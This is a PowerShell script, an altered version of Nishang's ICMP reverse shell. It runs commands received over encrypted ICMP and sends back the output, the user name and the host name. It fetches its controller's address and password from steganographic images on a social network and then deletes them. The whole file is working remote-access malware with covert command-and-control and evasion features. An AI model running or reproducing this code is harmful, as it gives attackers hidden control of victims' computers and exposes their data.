Import-Module (Join-Path $PSScriptRoot ".\Lib")

function Invoke-PowerShellIcmp
{ 
<#
.SYNOPSIS
Nishang script which can be used for a Reverse interactive PowerShell from a target over ICMP. 

.DESCRIPTION
This script can receive commands from a server, execute them and return the result to the server using only ICMP.

The server to be used with it is icmpsh_m.py from the icmpsh tools (https://github.com/inquisb/icmpsh).

.PARAMETER IPAddress
The IP address of the server/listener to connect to.

.PARAMETER Delay
Time in seconds for which the script waits for a command from the server. Default is 5 seconds. 

.PARAMETER BufferSize
The size of output Buffer. Defualt is 128.

.EXAMPLE
# sysctl -w net.ipv4.icmp_echo_ignore_all=1
# python icmpsh_m.py 192.168.254.226 192.168.254.1

Run above commands to start a listener on a Linux computer (tested on Kali Linux).
icmpsh_m.py is a part of the icmpsh tools.

On the target, run the below command.

PS > Invoke-PowerShellIcmp -IPAddress 192.168.254.226

Above shows an example of an interactive PowerShell reverse connect shell. 

.LINK
http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-5.html
https://github.com/samratashok/nishang
#>           
    [CmdletBinding()] Param(

        [Parameter(Position = 0, Mandatory = $true)]
        [String]
        $IPAddress,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $Password,

        [Parameter(Position = 2, Mandatory = $true)]
        [string]
        $Uid,

        [Parameter(Position = 1, Mandatory = $false)]
        [Int]
        $Delay = 5,

        [Parameter(Position = 2, Mandatory = $false)]
        [Int]
        $BufferSize = 512

    )
    
    # todo: refactor
    $checksum = "075231516e85d9c6b60102abb767dbfde920803eb2d79af4462608f8037a1a4e"
    $timeout = 60 * 1000

    $aes = [Crypto.AES]::New($Password)

    # Basic structure from http://stackoverflow.com/questions/20019053/sending-back-custom-icmp-echo-response
    # todo: ICMPClient class
    $icmp = New-Object System.Net.NetworkInformation.Ping
    $opt = New-Object System.Net.NetworkInformation.PingOptions
    $opt.DontFragment = $true

    # online
    $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes("online:" + $uid))
    $reply = $icmp.Send($IPAddress, $timeout, $buf, $opt)
    if ($reply.Buffer)
    {
        $response = $aes.Decrypt($reply.Buffer)
        $response = [Text.Encoding]::ASCII.GetString($response)
        if ($response -ne $checksum)
        {
            # invalid client
            return
        }
    }

    # Shell appearance and output redirection based on Powerfun - Written by Ben Turner & Dave Hardy
    $banner = "Windows PowerShell running as user " + $env:username + " on " + 
        $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n"

    $buf = $aes.Encrypt([Text.Encoding]::ASCII.GetBytes($banner))
    $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null

    #Show an interactive PowerShell prompt
    $sendbytes = [Text.Encoding]::ASCII.GetBytes('PS ' + (Get-Location).Path + '> ')
    $sendbytes = $aes.Encrypt($sendbytes)
    $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null

    while ($true)
    {
        $sendbytes = [Text.Encoding]::ASCII.GetBytes('')
        $sendbytes = $aes.Encrypt($sendbytes)
        $reply = $icmp.Send($IPAddress, $timeout, $sendbytes, $opt)
        $response = $aes.Decrypt($reply.Buffer)

        # Check for Command from the server
        if ($response.Length)
        {
            $cmd = [Text.Encoding]::ASCII.GetString($response)
            $result = (Invoke-Expression -Command $cmd 2>&1 | Out-String)
            $sendbytes = [text.encoding]::ASCII.GetBytes($result)
            $index = [Math]::Floor($sendbytes.length / $BufferSize)
            $i = 0

            # split into pieces
            if ($sendbytes.Length -gt $BufferSize)
            {
                while ($i -lt $index)
                {
                    $trunk = $sendbytes[($i*$BufferSize)..(($i+1)*$BufferSize)]
                    $buf = $aes.Encrypt($trunk)
                    $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
                    $i++
                }

                $tail = $sendbytes.Length % $BufferSize
                
                if ($tail)
                {
                    $trunk = $sendbytes[($i * $BufferSize)..($sendbytes.Length)]
                    $buf = $aes.Encrypt($trunk)
                    $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
                }
            }
            else
            {
                $buf = $aes.Encrypt($sendbytes)
                $icmp.Send($IPAddress, $timeout, $buf, $opt) | Out-Null
            }
            $sendbytes = [Text.Encoding]::ASCII.GetBytes("`nPS " + (Get-Location).Path + '> ')
            $sendbytes = $aes.Encrypt($sendbytes)
            $icmp.Send($IPAddress, $timeout, $sendbytes, $opt) | Out-Null
        }
        else
        {
            Start-Sleep -Seconds $Delay
        }
    }
}

$uid = "8fd2d4d2-1385-4b66-b4da-00191f6ee044"

# load config from social network
Get-Images "thisisaninvisibletag" | % {
	$buf = Read-Steg $_
	$json = [System.Text.ASCIIEncoding]::ASCII.GetString($buf)
	$config = ConvertFrom-Json $json
	Remove-Item $_
    Invoke-PowerShellIcmp -IPAddress $config.host -Password $config.password -Uid $uid
}